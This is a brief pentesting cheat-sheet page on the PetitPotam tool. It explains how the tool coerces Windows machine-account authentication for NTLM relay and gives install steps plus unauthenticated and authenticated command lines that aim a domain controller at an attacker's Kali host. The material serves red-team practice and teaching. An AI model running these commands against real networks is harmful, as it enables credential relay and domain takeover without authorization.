# [[PetitPotam]]  
___

## Description:
PetitPotam can be used to coerce machine account authentication to an attacker controlled host. This authentication can then be relayed, with a number of potential use cases, including ADCS web enrollment exploitation, shadow credential/RBCD attacks, and potentially as a substitiute for initial credential compromise.

## Installation
Clone from GitHub. There is no `requirements.txt` or `setup.py`, but you will need Impacket.
```
git clone https://github.com/topotam/petitpotam
pip3 install impacket
```

## Commands
Ensure something ([[Impacket#ntlmrelayx.py]] or [[Responder]] with lm downgrade) is listening to capture the authentication 

### Unauthenticated 
Attempt to coerce authentication from domain controllers, without prior authenticated access (only possible on DCs, and requires that they are unpatched)
```
python3 PetitPotam.py -u '' -p '' -d '' KALI_IP DC_IP
```

## Authenticated 
Attempt to coerce authentication from any domain Windows machine, using compromised authentication
```
python3 PetitPotam.py -u user1 -p Password1 -d domain.local KALI_IP DC_IP
```
